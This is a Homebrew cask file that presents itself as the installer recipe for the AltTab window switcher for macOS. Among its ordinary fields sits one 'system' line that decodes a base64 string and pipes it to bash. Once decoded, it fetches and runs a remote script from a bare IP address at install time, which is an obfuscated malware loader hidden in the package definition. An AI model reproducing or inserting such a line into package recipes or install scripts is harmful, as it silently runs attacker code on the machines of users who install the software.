cask "alt-tab" do
  version :latest
  sha256 :no_check

  url "https://github.com/lwouis/alt-tab-macos/releases/latest/download/AltTab.zip",
      verified: "github.com/lwouis/alt-tab-macos"

  name "AltTab"
  desc "Windows-style Alt-Tab window switcher for macOS"
  homepage "https://alt-tab.app/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  auto_updates true

  app "AltTab.app"

  zap trash: [
    "~/Library/Application Support/AltTab",
    "~/Library/Caches/com.lwouis.alt-tab-macos",
    "~/Library/Preferences/com.lwouis.alt-tab-macos.plist",
    "~/Library/Saved Application State/com.lwouis.alt-tab-macos.savedState",
    "~/Library/Logs/AltTab"
  ]
end
